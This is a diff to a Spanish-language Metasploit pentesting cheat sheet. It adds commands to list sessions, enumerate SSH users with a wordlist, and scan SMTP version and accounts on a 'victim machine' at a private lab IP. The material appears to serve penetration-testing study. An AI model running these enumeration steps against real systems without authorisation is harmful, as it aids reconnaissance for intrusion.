@@ -310,6 +310,20 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 	❯ set RHOSTS 192.168.1.194                    # Colocamos la IP de la maquina victima
 	❯ set VERBOSE true
 	❯ run 
+
+	❯ sessions                    # Miramos las sesiones 
+	❯ sessions 1                  # Ingresamos en la sesion creada 
+```
+
+```bash 
+# Enumeramos a los usuarios 
+❯ msfconsole -q                  # q = Quitar el banner de inicio
+
+	❯ use auxiliary/scanner/ssh/ssh_enumusers      # Usamos el auxiliar 
+	❯ options
+	❯ set RHOSTS 192.168.1.194                     # Colocamos la IP de la maquina victima
+	❯ set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+	❯ run 
 ```
 
 ## Shellshock (CVE-2014-6271)
@@ -517,6 +531,28 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 	❯ run 
 ```
 
+
+## Puerto 25 SMTP o (465, 587)
+
+```bash 
+# Miramos la version del SMTP
+❯ msfconsole -q                  # q = Quitar el banner de inicio
+
+	❯ use auxiliary/scanner/smtp/smtp_version      # Usamos el auxiliar 
+	❯ options
+	❯ set RHOSTS 192.168.1.194                     # Colocamos la IP de la maquina victima
+	❯ run 
+```
+
+```bash 
+# Enumeramos cuentas de usuarios 
+❯ msfconsole -q                  # q = Quitar el banner de inicio
+
+	❯ use auxiliary/admin/smtp/smtp_enum                  # Usamos el auxiliar 
+	❯ options
+	❯ set RHOSTS 192.168.1.194                              # Colocamos la IP de la maquina victima
+	❯ run
+```
 
 ------
 
